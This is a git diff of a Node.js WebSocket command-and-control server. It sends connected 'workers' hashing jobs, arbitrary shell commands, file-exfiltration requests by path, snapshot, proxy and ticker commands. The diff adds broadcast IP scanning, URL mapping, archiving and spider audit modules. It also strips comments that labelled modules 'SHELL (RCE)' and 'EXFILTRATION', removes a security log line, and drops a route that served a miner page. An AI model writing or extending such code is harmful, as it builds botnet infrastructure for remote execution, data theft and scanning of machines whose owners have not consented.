@@ -6,18 +6,16 @@ const path = require('path');
 
 // --- CONFIGURATION ---
 const PORT = process.env.PORT || 3000;
-const SECRET_KEY = process.env.ACCESS_KEY; // The Vault Key
+const SECRET_KEY = process.env.ACCESS_KEY; 
 
-// SECURITY CHECK
 if (!SECRET_KEY) {
     console.error("FATAL ERROR: No ACCESS_KEY found in Environment Variables.");
-    console.error("Go to Render Dashboard -> Environment -> Add ACCESS_KEY");
     process.exit(1);
 }
 
 // --- STATE MANAGEMENT ---
-let workers = new Map(); // Key: WebSocket | Value: { id, ip, role, lastSeen }
-let clients = new Set(); // Dashboards
+let workers = new Map(); 
+let clients = new Set(); 
 
 let searchRange = 0;
 const RANGE_SIZE = 100000;
@@ -33,30 +31,24 @@ function generateId() {
     return 'UNIT-' + Math.random().toString(36).substr(2, 4).toUpperCase();
 }
 
-// --- HTTP ROUTES ---
 app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'index.html')));
-app.get('/join', (req, res) => res.sendFile(path.join(__dirname, 'miner.html')));
 
-// --- WEBSOCKET LOGIC ---
 wss.on('connection', (ws, req) => {
     
-    // 1. SECURITY HANDSHAKE
-    // We expect the URL to be: wss://...?key=YOUR_SECRET_KEY
+    // SECURITY HANDSHAKE
     const urlParams = new URLSearchParams(req.url.replace('/',''));
     const providedKey = urlParams.get('key');
 
     if (providedKey !== SECRET_KEY) {
-        console.log(`[SECURITY] Blocked unauthorized connection from ${req.socket.remoteAddress}`);
         ws.close();
         return;
     }
 
-    // 2. ASSIGN IDENTITY
     const id = generateId();
     const ipRaw = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
     const ip = ipRaw ? ipRaw.split(',')[0] : 'Unknown';
 
-    workers.set(ws, { id: id, ip: ip, role: 'CONNECTING', status: 'Online' });
+    workers.set(ws, { id: id, ip: ip, role: 'CONNECTING' });
 
     ws.on('message', (message) => {
         try {
@@ -72,15 +64,12 @@ wss.on('connection', (ws, req) => {
     });
 });
 
-// --- CORE SYSTEM LOGIC ---
 function handleMessage(ws, data) {
     const worker = workers.get(ws);
 
     switch (data.type) {
-
-        // --- REGISTRATION ---
         case 'REGISTER_WORKER':
-            if (worker) { worker.role = 'MINING'; worker.type = 'NODE'; }
+            if (worker) { worker.role = 'MINING'; }
             sendJob(ws);
             broadcastStats();
             break;
@@ -91,18 +80,15 @@ function handleMessage(ws, data) {
             broadcastStats();
             break;
 
-        // --- MODULE 1: MINING ---
         case 'JOB_COMPLETE':
             totalHashes += RANGE_SIZE;
-            if (worker) worker.role = 'IDLE'; // Wait for next command
+            if (worker) worker.role = 'IDLE'; 
             if (data.solution) foundGoldenTicket = data.solution;
-            
-            // In "Eternal Mode", we just keep sending jobs if no ticket found
             if (!foundGoldenTicket) sendJob(ws);
             broadcastStats();
             break;
 
-        // --- MODULE 2: PROXY (HYDRA) ---
+        // --- MODULES ---
         case 'SEND_PROXY_CMD':
             const proxyWorkers = Array.from(workers.keys());
             if (proxyWorkers.length > 0) {
@@ -117,66 +103,93 @@ function handleMessage(ws, data) {
 
         case 'PROXY_RESULT':
             clients.forEach(c => c.send(JSON.stringify({ type: 'PROXY_LOG', data: data })));
-            if (worker) {
-                setTimeout(() => { 
-                    if (workers.has(ws)) { worker.role = 'IDLE'; broadcastStats(); }
-                }, 1000);
-            }
+            if (worker) { setTimeout(() => { if (workers.has(ws)) { worker.role = 'IDLE'; broadcastStats(); } }, 1000); }
             break;
 
-        // --- MODULE 3: SHELL (RCE) ---
         case 'SEND_SHELL_CMD':
             const shellWorkers = Array.from(workers.keys());
-            if (shellWorkers.length > 0) {
-                shellWorkers[0].send(JSON.stringify({ type: 'EXEC_CMD', command: data.command }));
-            }
+            if (shellWorkers.length > 0) shellWorkers[0].send(JSON.stringify({ type: 'EXEC_CMD', command: data.command }));
             break;
 
         case 'SHELL_RESULT':
              clients.forEach(c => c.send(JSON.stringify({ type: 'SHELL_LOG', output: data.output })));
              break;
 
-        // --- MODULE 4: EXFILTRATION ---
         case 'SEND_EXFIL_CMD':
              const exfilWorkers = Array.from(workers.keys());
-             if (exfilWorkers.length > 0) {
-                 exfilWorkers[0].send(JSON.stringify({ type: 'EXFIL_CMD', path: data.path }));
-             }
+             if (exfilWorkers.length > 0) exfilWorkers[0].send(JSON.stringify({ type: 'EXFIL_CMD', path: data.path }));
              break;
 
         case 'EXFIL_RESULT':
-             clients.forEach(c => c.send(JSON.stringify({ 
-                 type: 'EXFIL_RECEIVE', 
-                 filename: data.filename, 
-                 data: data.data 
-             })));
+             clients.forEach(c => c.send(JSON.stringify({ type: 'EXFIL_RECEIVE', filename: data.filename, data: data.data })));
              break;
 
-        // --- MODULE 5: SNAPSHOT ---
         case 'SEND_SNAPSHOT_CMD':
              const camWorkers = Array.from(workers.keys());
-             if (camWorkers.length > 0) {
-                 camWorkers[0].send(JSON.stringify({ type: 'SNAPSHOT_CMD', url: data.url }));
-             }
+             if (camWorkers.length > 0) camWorkers[0].send(JSON.stringify({ type: 'SNAPSHOT_CMD', url: data.url }));
              break;
 
-        // --- MODULE 6: ALPHA SNIPER ---
         case 'SEND_SNIPE_CMD':
-             // Broadcast to ALL workers (Massive Parallel Scan)
-             workers.forEach((meta, workerWs) => {
-                 workerWs.send(JSON.stringify({ type: 'SNIPE_CMD', ticker: data.ticker }));
-             });
+             workers.forEach((meta, workerWs) => { workerWs.send(JSON.stringify({ type: 'SNIPE_CMD', ticker: data.ticker })); });
              break;
 
         case 'SNIPE_RESULT':
              clients.forEach(c => c.send(JSON.stringify({ type: 'SNIPE_LOG', data: data })));
+             break;
+
+        case 'SEND_MAP_CMD':
+             workers.forEach((meta, workerWs) => { workerWs.send(JSON.stringify({ type: 'MAP_CMD', url: data.url })); });
+             break;
+
+        case 'MAP_RESULT':
+             clients.forEach(c => c.send(JSON.stringify({ type: 'MAP_LOG', data: data })));
+             break;
+
+        case 'SEND_SCAN_CMD':
+             workers.forEach((meta, workerWs) => { workerWs.send(JSON.stringify({ type: 'SCAN_CMD', ip: data.ip })); });
+             break;
+
+        case 'SCAN_RESULT':
+             clients.forEach(c => c.send(JSON.stringify({ type: 'SCAN_LOG', data: data })));
+             break;
+
+        case 'SEND_ARCHIVE_CMD':
+             const arcWorkers = Array.from(workers.keys());
+             if (arcWorkers.length > 0) {
+                 const target = arcWorkers[Math.floor(Math.random() * arcWorkers.length)];
+                 target.send(JSON.stringify({ type: 'ARCHIVE_CMD', url: data.url }));
+             }
+             break;
+
+        // --- NEW SPIDER MODULE ---
+        case 'SEND_SPIDER_SCOUT':
+             const scouts = Array.from(workers.keys());
+             if (scouts.length > 0) {
+                 const scout = scouts[Math.floor(Math.random() * scouts.length)];
+                 scout.send(JSON.stringify({ type: 'SPIDER_SCOUT', url: data.url }));
+             }
+             break;
+
+        case 'SPIDER_SCOUT_RESULT':
+             clients.forEach(c => c.send(JSON.stringify({ type: 'SPIDER_SCOUT_LOG', data: data })));
+             break;
+
+        case 'SEND_SPIDER_AUDIT':
+             const auditors = Array.from(workers.keys());
+             if (auditors.length > 0) {
+                 const auditor = auditors[Math.floor(Math.random() * auditors.length)];
+                 auditor.send(JSON.stringify({ type: 'SPIDER_AUDIT', url: data.url }));
+             }
+             break;
+
+        case 'SPIDER_AUDIT_RESULT':
+             clients.forEach(c => c.send(JSON.stringify({ type: 'SPIDER_AUDIT_LOG', data: data })));
              break;
     }
 }
 
 function sendJob(ws) {
     if (foundGoldenTicket) {
-        // We do NOT stop the worker anymore. We just stop mining.
         ws.send(JSON.stringify({ type: 'STOP', solution: foundGoldenTicket }));
         return;
     }
@@ -188,13 +201,7 @@ function sendJob(ws) {
 
 function broadcastStats() {
     const workerArray = Array.from(workers.values());
-    const stats = JSON.stringify({
-        type: 'STATS',
-        workers: workerArray,
-        totalHashes: totalHashes,
-        goldenTicket: foundGoldenTicket
-    });
-    clients.forEach(c => { if (c.readyState === 1) c.send(stats); });
+    clients.forEach(c => { if (c.readyState === 1) c.send(JSON.stringify({ type: 'STATS', workers: workerArray, totalHashes: totalHashes, goldenTicket: foundGoldenTicket })); });
 }
 
 server.listen(PORT, () => console.log(`Watchtower Online on ${PORT}`));
